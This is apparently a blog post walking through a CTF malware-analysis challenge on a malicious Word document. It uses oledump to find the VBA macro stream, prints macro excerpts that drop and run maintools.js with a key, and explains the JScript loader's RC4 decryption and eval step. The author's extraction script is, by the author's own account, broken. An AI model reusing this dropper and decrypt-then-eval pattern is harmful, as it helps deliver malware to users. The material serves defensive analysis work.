---
layout: post
category: CTF
---
The assignment is as follows:
During your shift as a SOC analyst, the enterprise EDR alerted a suspicious behavior from an end-user machine. The user indicated that he received a recent email with a DOC file from an unknown sender and passed the document for you to analyze.

### Table of contents
- [Macros in stream](#macros-in-streams)
- [OLE streams and embedded VBA macros](#ole-streams-and-embedded-vba-macros)
- [Contents of the VBA script](#contents-of-the-vba-script)
- [Cleaning up the script](#detour-cleaning-up-the-script)
- [Maintools.js](#maintoolsjs)
- [Cryptograph](#cryptography)
- [Wrapping up](#wrapping-up)
- [Conclusion](#conclusion)

### Macros in streams 

	Q: Multiple streams contain macros in this document. Provide the number of lowest one.

```
  1:       114 '\x01CompObj'
  2:       284 '\x05DocumentSummaryInformation'
  3:       392 '\x05SummaryInformation'
  4:      8017 '1Table'
  5:      4096 'Data'
  6:       483 'Macros/PROJECT'
  7:        65 'Macros/PROJECTwm'
  8: M    7117 'Macros/VBA/Module1'
  9: m    1104 'Macros/VBA/ThisDocument'
 10:      3467 'Macros/VBA/_VBA_PROJECT'
 11:      2964 'Macros/VBA/__SRP_0'
 12:       195 'Macros/VBA/__SRP_1'
 13:      2717 'Macros/VBA/__SRP_2'
 14:       290 'Macros/VBA/__SRP_3'
 15:       565 'Macros/VBA/dir'
 16:        76 'ObjectPool/_1541577328/\x01CompObj'
 17: O   20301 'ObjectPool/_1541577328/\x01Ole10Native'
 18:      5000 'ObjectPool/_1541577328/\x03EPRINT'
 19:         6 'ObjectPool/_1541577328/\x03ObjInfo'
 20:    133755 'WordDocument'
```

To see all macros in the ole streams we can use `Oledump` which enables us to quickly discover possible culprits in our investigation thanks to the indicators next to the stream number. Here is an overview of all possible indicators bellow:

- M: Macro (attributes and code)
- m: macro (attributes without code)
- E: Error (code that throws an error when decompressed)
- !: Unusual macro (code without attributes)
- O: object (embedded file)
- .: storage
- R: root entry

So for our use case we will take a closer look at stream #8 - since it contains a macro with attributes and code. 

---
#### OLE streams and embedded VBA macros 

You can skip this part if you are only interested in the challenge. But I try to  look at these challenges in slightly different light and if something interests me I try and dig little deeper 

You might or might not heard about OLE files but in essence : 
```
An OLE file can be seen as a mini file system or a Zip archive: It contains streams of data that look like files embedded within the OLE file. Each stream has a name. For example, the main stream of a MS Word document containing its text is named “WordDocument”.

An OLE file can also contain storages. A storage is a folder that contains streams or other storages. For example, a MS Word document with VBA macros has a storage called “Macros”.

Special streams can contain properties. A property is a specific value that can be used to store information such as the metadata of a document (title, author, creation date, etc).
```
[About the structure of OLE files](https://olefile.readthedocs.io/en/latest/OLE_Overview.html)

With this info we can basically unzip the evil doc as if it were regular zip file. If we decide to do so we are able to navigate the file structure and find the suspicious stream `Module1`

If we just try to open the file with text editor we might see some text but certainly it is not readable - we have to decompress it  ( i found that maybe some older formats such as .doc may use LZ77 compression algorithm - but I'm not certain so maybe someone can share some insight )

I took a look at source code of `oledump`  and found following functions - that to my knowledge are responsible for the decompression 

[OleDump-source](https://github.com/DidierStevens/DidierStevensSuite/blob/master/oledump.py)

```
def DecompressChunk(compressedChunk):
    if len(compressedChunk) < 2:
        return None, None
    header = P23Ord(compressedChunk[0]) + P23Ord(compressedChunk[1]) * 0x100
    size = (header & 0x0FFF) + 3
    flagCompressed = header & 0x8000
    data = compressedChunk[2:2 + size - 2]

    if flagCompressed == 0:
        return data.decode(errors='ignore'), compressedChunk[size:]

    decompressedChunk = ''
    while len(data) != 0:
        tokens, data = ParseTokenSequence(data)
        for token in tokens:
            if type(token) == int:
                decompressedChunk += chr(token)
            elif len(token) == 1:
                decompressedChunk += token
            else:
                if decompressedChunk == '':
                    return None, None
                numberOfOffsetBits = OffsetBits(decompressedChunk)
                copyToken = P23Ord(token[0]) + P23Ord(token[1]) * 0x100
                offset = 1 + (copyToken >> (16 - numberOfOffsetBits))
                length = 3 + (((copyToken << numberOfOffsetBits) & 0xFFFF) >> numberOfOffsetBits)
                copy = decompressedChunk[-offset:]
                copy = copy[0:length]
                lengthCopy = len(copy)
                while length > lengthCopy: #a#
                    if length - lengthCopy >= lengthCopy:
                        copy += copy[0:lengthCopy]
                        length -= lengthCopy
                    else:
                        copy += copy[0:length - lengthCopy]
                        length -= length - lengthCopy
                decompressedChunk += copy
    return decompressedChunk, compressedChunk[size:]

def Decompress(compressedData, replace=True):
    if P23Ord(compressedData[0]) != 1:
        return (False, None)
    remainder = compressedData[1:]
    decompressed = ''
    while len(remainder) != 0:
        decompressedChunk, remainder = DecompressChunk(remainder)
        if decompressedChunk == None:
            return (False, decompressed)
        decompressed += decompressedChunk
    if replace:
        return (True, decompressed.replace('\r\n', '\n'))
    else:
        return (True, decompressed)
```
---
### Contents of the VBA script 

    Q: What is the decryption key of the obfuscated code?

If we want to see the contents of the VBA script we have to decompress it first. 
The decompression can be done with `oledump` 

- we might read the streams directly and then decompress it  with :

`oledump 49b367ac261a722a7c2bbbc328c32545 -s 8 -v` 

- or ( if we unzipped the file ) navigate to the `Module1` and  read it with `-r` (raw)  and `-v` (vbadecompress) :

`oledump -r C:\Users\xd\Desktop\cyberdefenders\76-Obfuscated\49b367ac261a722a7c2bbbc328c32545~\Macros\VBA\Module1 -v` 

Both produce the same output - obfuscated code. 

Snippet bellow gives us a glimpse into what we are dealing with : 
```
B8qen2T433Ds1bW = Environ("appdata") & "\Microsoft\Windows"
Set R7Ks7ug4hRR2weOy7 = CreateObject("Scripting.FileSystemObject")
If Not R7Ks7ug4hRR2weOy7.FolderExists(B8qen2T433Ds1bW) Then
B8qen2T433Ds1bW = Environ("appdata")
End If
Set R7Ks7ug4hRR2weOy7 = Nothing
Dim K764B5Ph46Vh
K764B5Ph46Vh = FreeFile
OBKHLrC3vEDjVL = B8qen2T433Ds1bW & "\" & "maintools.js"
Open (OBKHLrC3vEDjVL) For Binary As #K764B5Ph46Vh
Put #K764B5Ph46Vh, 1, Wk4o3X7x1134j
Close #K764B5Ph46Vh
Erase Wk4o3X7x1134j
Set R66BpJMgxXBo2h = CreateObject("WScript.Shell")
R66BpJMgxXBo2h.Run """" + OBKHLrC3vEDjVL + """" + " EzZETcSXyKAdF_e5I2i1"
ActiveDocument.Save
Exit Sub
MnOWqnnpKXfRO:
Close #K764B5Ph46Vh
ActiveDocument.Save
End Sub

```

You might have noticed some interesting variables / functions such as : 
- `OBKHLrC3vEDjVL` - Full path to maintools.js
- `R66BpJMgxXBo2h` - WHS 

Especially the last one `R66BpJMgxXBo2h` that creates WHS that is then used to run `OBKHLrC3vEDjVL` ( maintools.js) with decryption key `EzZETcSXyKAdF_e5I2i1`

---
#### Detour cleaning up the script

I would like to give a shutout to : 
[Ritam-dey](https://ritam-dey.notion.site/Obfuscated-a02c32a601a14f479ac4062518bcbd11)

As it was essential in better understanding the obfuscated VB script and creating decryption python script for encrypted maintools.js in embedded OLE object. 

---
### maintools.js

Next few section will be primarily dealing with the extracted jscript. 
 
	Q: This script uses what language? 

We have two options when it comes to extracting the .js file 

- The first one would be to simply detonate the infected doc file inside a sand-boxed environment and simply retrieve the dropped file. 
- Second option is to reverse-engineer the VBA script and manually decrypt maintools.js that is embedded inside the OLE object that resides in stream 17 ( we can see that in the first question )

To be honest I have used both methods - the first option just to simply progress with the challenge and see that the language used is `Jscript`. But I have also tried to write an Python script that would take the bin object form stream 17 and decrypt it. 

Here is the snippet I've come up with ( after some inspiration ) but unfortunately it doesn't really work ( maybe someone can point out the obvious flaw in the code )

```
inpath = input("path to file ( if left blank object.bin in folder of this file will be used):" ) 
path=""
if inpath == '':
    path = "object.bin"
else:
    path = inpath
    
with open(path, "rb") as fin:
    encrypted = fin.read()
encrypted_len = 16827
decrypted = ""
seed = 45
for i in range(81,encrypted_len):
    try:
        # Attempt to decrypt the character
        decrypted_char = chr(encrypted[i] ^ seed)
        print(f" the byte is {encrypted[i]}")
        decrypted += decrypted_char                             
    except UnicodeEncodeError:
        print(f"Error: Invalid encoding at index {i}") 
        decrypted += '?'
    seed = ((seed ^ 99) ^ (i % 254))
    print(f"seed is {seed}") 

with open("maintool.js", "w", encoding="utf-16") as fout:
	fout.write(decrypted)
```


After extracting the code we can quickly answer the following questions 

	Q:What is the name of the variable that is assigned the command-line arguments

	Q:How many command-line arguments does this script expect?

	Q:What instruction is executed if this script encounters an error?

In the snippet below we can basically see what is the desired outcome of this script ... unsurprisingly to `eval()` decrypted command - but we will get to that later. 

For now we can see that the command line arguments passed from previous VBA script are assigned to `wvy1` variable 

We get the first ( and only ) argument expected (**the decryption key**) and assign it to `ssWZ`

And if there is any error in the execution the `WScript.Quit()` is called 

```
try{
	var wvy1 = WScript.Arguments;
	var ssWZ = wvy1(0);
	var ES3c = y3zb();
	ES3c = LXv5(ES3c);
	ES3c = CpPT(ssWZ,ES3c);
	eval(ES3c);
	}
catch (e){
	WScript.Quit();
	}
```

If we want to understand the code better and its functionality we can manually de-obfuscate the extracted JScript. ( For our convenience I have done so here :  [Cleaned Stage 2 ](https://github.com/fpilb/fpilb.github.io/blob/0ff9cdc87261108104c04d4cb92e024dca1d990a/projects/CTF/76-obfuscated/cleaned_stage2.js.evil) )

This allows us to interpret more complicated functions such as - `LXv5` which facilitates the first round of base64 decryption. But lets not get ahead of ourselves we have more questions that need answering : 

	Q: What function returns the next stage of code (i.e. the first round of obfuscated code)?

The question is slightly misleading in my opinion as the actual function that handles the first round of decrypting is aforementioned `LXv5` but the question is asking about `y3zb` - which is basically just a function that returns a big base64 encoded blob of data. 

	Q:The function LXv5 is an important function, what variable is assigned a key string value in determining what this function does?

When we take a closer look at the `LXv5` function we see some interesting variables such as `LUK7` - ( which is the answer for the question ) as well as bitwise operation based on character positions in the base64 encoded blob. 

I hope that based on the things we said the answer to the next question is explanatory 

	Q:What encoding scheme is this function responsible for decoding?

Unfortunately the next question is not that easy. 

---
### Cryptography

	In the function CpPT, the first two for loops are responsible for what important part of this function?

This is the somewhat cleaned up version of the CpPT function mentioned above;   

```
function second_decrypt_func(ws_key,array_to_decrypt){
	var 256_array = [];
	var V2Vl = 0;
	var iter_obj;
	var decoded_str = '';
	for (var i = 0; i < 256; i++){
		 256_array[i] = i;
	}
	for (var i = 0;i < 256;i++){
		V2Vl = (V2Vl + 256_array[i] + ws_key.charCodeAt(i % ws_key.length)) % 256;
		iter_obj = 256_array[i];
		256_array[i] = 256_array[V2Vl];
		256_array[V2Vl] = iter_obj;
	}
	var i = 0;
	var V2Vl = 0;
	for (var y = 0;y < array_to_decrypt.length; y++){
		i = (i + 1) % 256;
		V2Vl = (V2Vl + 256_array[i]) % 256;
		iter_obj = 256_array[i];
		256_array[i] = 256_array[V2Vl];
		256_array[V2Vl] = iter_obj;
		decoded_str += String.fromCharCode(array_to_decrypt[y] ^ 256_array[(256_array[i] + 256_array[V2Vl]) % 256]);
	}
	return decoded_str;
}
```

The first for loop just sets up array with numbers form 0-256 ... easy enough. 

The second loop updates the `V2Vl` variable by adding the value at `256_array[i]` and the character code of ws_key at index modulo length of the ws_key ( the `ws_key` is the `ssWZ` we extracted earlier from WScript.Arguments ) and finally taking the result modulo 256. After which the for loop does some value swapping in the 256_array 

Right ... we might understand what the individual loops do but what is this actually called? So after some digging I found that this process is called - `key-scheduling algorithm` often used by RC4

---
### Wrapping up 

	Q:The function CpPT requires two arguments, where does the value of the first argument come from?

	Q:For the function CpPT, what does the first argument represent?

We basically answered this one - the first argument `ssWZ` is the key for decryption. That we got from `command-line argument` ( WScript.Arguments )

	Q:What function is responsible for executing the deobfuscated code?

As everybody already knows `eval()` functions are evil so we always look for them. Just a side note in the cleaned version of the stage 2 script I have replaced the eval function with `WScript.Echo()`which just prints the result of the full script instead of executing it. 

	Q:What Windows Script Host program can be used to execute this script in command-line mode?

We can simply google how to run jscript code in command line and the first answer is the right one it is `cscript.exe` 

	Q:What is the name of the first function defined in the deobfuscated code?

Final question - to reveal the encrypted code this malware is trying to execute we can replace the eval with the WScript.Echo as I mentioned earlier and see that the first defined function is - `UspD`

---
### Conclusion 

This concludes the full challenge but as you might have guessed - there is more. I do not want to get ahead of myself but the last question already hinted that there is another stage of this malware 

We will not be covering the full analysis in this post but there will be part 2 - starting right here where we left off. 

For anyone interested [here is the raw stage 3 js file](https://github.com/fpilb/fpilb.github.io/blob/master/projects/CTF/76-obfuscated/stage3.js.evil) so you can explore on your own in mean time 